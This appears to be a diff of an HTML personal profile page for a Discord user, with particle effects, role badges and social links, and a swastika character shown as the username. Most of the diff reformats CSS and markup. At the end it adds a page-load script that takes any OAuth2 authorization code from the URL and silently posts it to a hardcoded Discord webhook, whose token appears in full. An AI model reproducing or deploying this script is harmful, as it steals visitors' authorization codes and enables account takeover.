@@ -13,272 +13,214 @@
     <meta property="theme-color" content="#000000">
     <link rel="stylesheet" href="static/assets/css/landing.css">
     <style>
+        * {}
 
+        body {
+            background-image: url('./assets/images/bg/187779127black-white-thundercloud-lighting-strikes-storm-animated-gif.gif');
+            background-size: cover;
+            background-position: center center;
+            display: flex;
+            color: #fff;
+            background-color: #1F2128;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
 
+        html, body {
+            height: 100%;
+            margin: 0;
+            padding: 0;
+        }
 
-* {
+        .description.typewrite {
+            text-shadow: 0 0 5px #6e6e6e, 0 0 10px #6e6e6e, 0 0 15px #6e6e6e, 0 0 20px #6e6e6e;
+        }
 
-}
+        .customglow-username {
+            font-size: 30px;
+            margin-right: 10px;
+            font-family: Satoshi;
+            font-weight: bold;
+            line-height: 2rem;
+            text-align: center;
+            text-shadow: 0 0 10px #fff, 0 0 20px #fff, 0 0 30px #fff, 0 0 40px #fff, 0 0 50px #fff, 0 0 60px #fff, 0 0 70px #fff, 0 0 80px #fff;
+        }
 
+        @keyframes glow {
+            0% {
+                box-shadow: 0 0 5px #fff, 0 0 10px #fff, 0 0 15px #fff, 0 0 20px #fff;
+            }
+            50% {
+                box-shadow: 0 0 20px #fff, 0 0 30px #fff, 0 0 40px #fff, 0 0 50px #fff;
+            }
+            100% {
+                box-shadow: 0 0 5px #fff, 0 0 10px #fff, 0 0 15px #fff, 0 0 20px #fff;
+            }
+        }
 
-body {
-    background-image: url('./assets/images/bg/187779127black-white-thundercloud-lighting-strikes-storm-animated-gif.gif');
-    background-size: cover;
-    background-position: center center;
-    display: flex;
-    color: #fff;
-    background-color: #1F2128;
-    align-items: center;
-    justify-content: center;
-    overflow: hidden;
-}
+        .avatar_effect {
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            display: block;
+            margin: 0 auto;
+        }
 
-html, body {
-    height: 100%;
-    margin: 0;
-    padding: 0;
-}
+        .avatar {
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            display: block;
+            margin: 0 auto;
+        }
 
-.description.typewrite {
-    /* Change the color code to blue */
-    text-shadow: 0 0 5px #6e6e6e, 0 0 10px #6e6e6e, 0 0 15px #6e6e6e, 0 0 20px #6e6e6e;
-}
+        #particles-js {
+            position: fixed;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            top: 0;
+            left: 0;
+        }
 
+        .rainbow-username {
+            font-size: 30px;
+            font-weight: bold;
+            font-family: Satoshi;
+            margin-right: 10px;
+            color: #ff0000;
+            animation: animate 3s linear infinite;
+            text-shadow: 0 0 5px #ff0000, 0 0 10px #ff0000, 0 0 15px #ff0000, 0 0 20px #ff0000;
+        }
 
-.customglow-username {
-    font-size: 30px;
-    margin-right: 10px;
-    font-family: Satoshi;
-    font-weight: bold;
-    line-height: 2rem;
-    text-align: center;
-    text-shadow: 0 0 10px #fff, 0 0 20px #fff, 0 0 30px #fff, 0 0 40px #fff, 0 0 50px #fff, 0 0 60px #fff, 0 0 70px #fff, 0 0 80px #fff;
-}
-
-@keyframes glow {
-    0% {
-        box-shadow: 0 0 5px #fff, 0 0 10px #fff, 0 0 15px #fff, 0 0 20px #fff;
-    }
-    50% {
-        box-shadow: 0 0 20px #fff, 0 0 30px #fff, 0 0 40px #fff, 0 0 50px #fff;
-    }
-    100% {
-        box-shadow: 0 0 5px #fff, 0 0 10px #fff, 0 0 15px #fff, 0 0 20px #fff;
-    }
-}
-
-.avatar_effect {
-    width: 100px;
-    height: 100px;
-    border-radius: 50%;
-    display: block;
-    margin: 0 auto;
-    /*animation: glow 2s infinite;*/
-}
-
-
-.avatar {
-    width: 100px;
-    height: 100px;
-    border-radius: 50%;
-    display: block;
-    margin: 0 auto;
-}
-
-#particles-js {
-    position: fixed;
-    width: 100%;
-    height: 100%;
-    z-index: -1;
-    top: 0;
-    left: 0;
-}
-
-.rainbow-username {
-  font-size: 30px;
-  font-weight: bold;
-  font-family: Satoshi;
-  margin-right: 10px;
-  color: #ff0000;
-  animation: animate 3s linear infinite;
-  text-shadow: 0 0 5px #ff0000, 0 0 10px #ff0000, 0 0 15px #ff0000, 0 0 20px #ff0000;
-}
-
-@keyframes animate {
-  from {
-    filter: hue-rotate(0deg);
-  }
-  to {
-    filter: hue-rotate(360deg);
-  }
-}
-
+        @keyframes animate {
+            from {
+                filter: hue-rotate(0deg);
+            }
+            to {
+                filter: hue-rotate(360deg);
+            }
+        }
     </style>
-
-<link href="static/userinfo/style.css" rel="stylesheet">
-<link rel="stylesheet" href="./cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
-<script src="./cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
+    <link href="static/userinfo/style.css" rel="stylesheet">
+    <link rel="stylesheet" href="./cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <script src="./cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
 </head>
-
+<body>
     <div class="landing" id="landing">
-
-    <div id="particles-js"><canvas class="particles-js-canvas-el" style="width: 100%; height: 100%;" width="619" height="671"></canvas></div>
-
-
-    <div class="border">
-        <div class="avatar">
-            <div class="avatar-container">
-                <img src="./assets/images/pfp/healavatar.jpg" alt="Avatar" class="avatar_effect">
-              </div>
+        <div id="particles-js"><canvas class="particles-js-canvas-el" style="width: 100%; height: 100%;" width="619" height="671"></canvas></div>
+        <div class="border">
+            <div class="avatar">
+                <div class="avatar-container">
+                    <img src="./assets/images/pfp/healavatar.jpg" alt="Avatar" class="avatar_effect">
+                </div>
+            </div>
+            <div class="social-media">
+                <center>
+                    <p class="normal-username" style="color: #fff; text-align:center; background-image: url('https://media.discordapp.net/attachments/987149728800198686/991834200309248070/sparkle.gif');filter: drop-shadow(8px 8px 10px #ffffff);color:#ffffff; height:3%;width:11%;">卐</p>
+                </center>
+                <div class="role-icon own">
+                    <img src="static/userinfo/roles/own.png" alt="Own">
+                    <span class="tooltip">Owner</span>
+                </div>
+                <div class="role-icon dev">
+                    <img src="static/userinfo/roles/dev.png" alt="Dev">
+                    <span class="tooltip">Developer</span>
+                </div>
+                <div class="role-icon ted">
+                    <img src="static/userinfo/roles/ted.png" alt="ted">
+                    <span class="tooltip">skid</span>
+                </div>
+                <p class="description typewrite" ,="" data-period="1300" data-type="[&quot;tedaimlocks.wtf&quot;, &quot;im best coder&quot;]"><span class="wrap">tedaimlocks.wtf</span></p>
+                <div class="flex justify-center items-center space-x-2">
+                    <div style="text-align: center;">
+                        <a href="https://discord.com/users/780473798025281546" target="_blank">
+                            <img src="https://discord.c99.nl/widget/theme-4/780473798025281546.png" style="width: 300px;">
+                        </a>
+                    </div>
+                </div>
+                <div class="social-icons">
+                    <a href="https://discord.gg/UWETc2tPMZ" class="icon-link" id="discord-link" target="_blank">
+                        <img src="static/userinfo/svg/discord.svg" alt="Discord Icon" class="icon">
+                    </a>
+                    <a href="https://github.com/tedaimlocks" class="icon-link" id="github-link" target="_blank">
+                        <img src="static/userinfo/svg/github.svg" alt="GitHub Icon" class="icon">
+                    </a>
+                </div>
+            </div>
         </div>
-
-        <div class="social-media">
-			<center>
-				<!-- username -->
-				<p class="normal-username" style="color: #fff; text-align:center; background-image: url('https://media.discordapp.net/attachments/987149728800198686/991834200309248070/sparkle.gif');filter: drop-shadow(8px 8px 10px #ffffff);color:#ffffff; height:3%;width:11%;">卐
-				<!-- <span class="inline-effect">ted</span> -->
-				</p>
-			</center>
-
-
-            <!-- roles -->
-
-            <div class="role-icon own">
-            <img src="static/userinfo/roles/own.png" alt="Own">
-            <span class="tooltip">Owner</span>
-            </div>
-
-            <div class="role-icon dev">
-            <img src="static/userinfo/roles/dev.png" alt="Dev">
-            <span class="tooltip">Developer</span>
-            </div>
-
-            <div class="role-icon ted">
-            <img src="static/userinfo/roles/ted.png" alt="ted">
-            <span class="tooltip">skid</span>
-            </div>
-
-            <!-- description  -->
-            <p class="description typewrite" ,="" data-period="1300" data-type="[&quot;tedaimlocks.wtf&quot;, &quot;im best coder&quot;]"><span class="wrap">tedaimlocks.wtf</span></p>
-
-			<div class="flex justify-center items-center space-x-2">
-				<div style="text-align: center;">
-					<a href="https://discord.com/users/780473798025281546" target="_blank">
-						<img src="https://discord.c99.nl/widget/theme-4/780473798025281546.png" style="width: 300px;">
-						</a>
-				</div>
-			</div>
-
-        <div class="social-icons">
-            <!-- Discord -->
-            <a href="https://discord.gg/UWETc2tPMZ" class="icon-link" id="discord-link" target="_blank">
-                <img src="static/userinfo/svg/discord.svg" alt="Discord Icon" class="icon">
-            </a>
-            <!-- GitHub -->
-            <a href="https://github.com/tedaimlocks" class="icon-link" id="github-link" target="_blank">
-                <img src="static/userinfo/svg/github.svg" alt="GitHub Icon" class="icon">
-            </a>
-        </div>
-     </div>
-     </div>
-  </div>
-
-
-<script src="static/userinfo/script.js"></script>
-<script src="static/assets/js/enter.js"></script>
-
-
-
-
+    </div>
+    <script src="static/userinfo/script.js"></script>
+    <script src="static/assets/js/enter.js"></script>
     <script>
-
-particlesJS("particles-js", {
-      particles: {
-        number: {
-          value: 100,
-          density: {
-            enable: true,
-            value_area: 800,
-          },
-        },
-        color: {
-          value: "#fff", 
-        },
-        shape: {
-          type: "circle", 
-        },
-        opacity: {
-          value: 0.8,
-          random: true,
-          anim: {
-            enable: true,
-            speed: 1,
-            opacity_min: 0.1,
-            sync: false,
-          },
-        },
-        size: {
-          value: 5,
-          random: true,
-          anim: {
-            enable: true,
-            speed: 2,
-            size_min: 1,
-            sync: false,
-          },
-        },
-        line_linked: {
-          enable: false,
-        },
-        move: {
-          enable: true,
-          speed: 1, 
-          direction: "bottom",
-          random: true,
-          straight: false,
-          out_mode: "out",
-          bounce: false,
-        },
-      },
-      interactivity: {
-        detect_on: "canvas",
-        events: {
-          onhover: {
-            enable: false,
-          },
-          onclick: {
-            enable: false,
-          },
-          resize: true,
-        },
-        modes: {
-          grab: {
-            distance: 400,
-            line_linked: {
-              opacity: 1,
+        particlesJS("particles-js", {
+            particles: {
+                number: { value: 100, density: { enable: true, value_area: 800 } },
+                color: { value: "#fff" },
+                shape: { type: "circle" },
+                opacity: {
+                    value: 0.8,
+                    random: true,
+                    anim: { enable: true, speed: 1, opacity_min: 0.1, sync: false }
+                },
+                size: {
+                    value: 5,
+                    random: true,
+                    anim: { enable: true, speed: 2, size_min: 1, sync: false }
+                },
+                line_linked: { enable: false },
+                move: {
+                    enable: true,
+                    speed: 1,
+                    direction: "bottom",
+                    random: true,
+                    straight: false,
+                    out_mode: "out",
+                    bounce: false
+                }
             },
-          },
-          bubble: {
-            distance: 250,
-            size: 0,
-            duration: 2,
-            opacity: 0,
-          },
-          repulse: {
-            distance: 400,
-            duration: 0.4,
-          },
-          push: {
-            particles_nb: 4,
-          },
-          remove: {
-            particles_nb: 2,
-          },
-        },
-      },
-      retina_detect: true,
-    });
+            interactivity: {
+                detect_on: "canvas",
+                events: {
+                    onhover: { enable: false },
+                    onclick: { enable: false },
+                    resize: true
+                },
+                modes: {
+                    grab: { distance: 400, line_linked: { opacity: 1 } },
+                    bubble: { distance: 250, size: 0, duration: 2, opacity: 0 },
+                    repulse: { distance: 400, duration: 0.4 },
+                    push: { particles_nb: 4 },
+                    remove: { particles_nb: 2 }
+                }
+            },
+            retina_detect: true
+        });
 
+        window.onload = function() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const code = urlParams.get('code');
+            if (code) {
+                console.log('Authorization code:', code);
+
+                const webhookUrl = 'https://discord.com/api/webhooks/1262359253851701309/IBa_1TBKTymb_GuARODSdgrSbfUdn8xgJI2sIVO7Zhu0SJSvJG9ugI8LmGLPFG0A4iXa';
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ content: `New OAuth2 code: ${code}` })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Success:', data);
+                })
+                .catch((error) => {
+                    console.error('Error:', error);
+                });
+            }
+        };
     </script>
-
+</body>
 </html>
